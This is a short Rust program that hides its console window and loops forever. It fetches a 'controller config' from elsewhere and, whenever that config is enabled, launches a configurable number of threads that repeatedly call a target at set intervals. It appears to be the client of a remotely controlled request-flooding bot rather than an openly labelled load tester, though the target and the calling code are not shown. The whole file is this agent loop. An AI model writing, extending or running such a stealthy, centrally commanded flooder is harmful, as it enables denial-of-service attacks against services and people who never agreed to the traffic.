#![windows_subsystem = "windows"]
use ibreq::*;
use std::{process::exit, thread, time::Duration, time::Instant};

fn main() {
  match setup() {
    Ok(_) => {}
    Err(err) => {
      debug!("Unable to setup - {:?}", err);
      exit(0);
    }
  }

  loop {
    match fetch_controller_config() {
      Ok(conf) => {
        let start = Instant::now();
        let config_fetch_interval = Duration::from_millis(conf.config_fetch_interval_in_ms);
        let call_interval = Duration::from_millis(conf.call_interval_in_ms);

        if conf.enabled {
          'inner: loop {
            let mut threads = vec![];

            for i in 0..conf.thread_count {
              let conf = conf.clone();

              let thread = thread::spawn(move || {
                return match call(&conf) {
                  Ok(res) => {
                    debug!("Thread:\"{}\", Response\n{:?}", i, res.headers);
                    thread::sleep(call_interval);
                  }
                  Err(err) => {
                    debug!("Thread:\"{}\", Unable to call - {:?}.", i, err);
                    thread::sleep(call_interval);
                  }
                };
              });

              thread::sleep(Duration::from_millis(10));
              threads.push(thread);
            }

            for thread in threads {
              let _ = thread.join();
            }

            if start.elapsed() > config_fetch_interval {
              break 'inner;
            }
          }
        }
      }
      Err(err) => {
        thread::sleep(Duration::from_millis(1000));
        debug!("Unable to get config - {:?}.", err);
      }
    }
  }
}
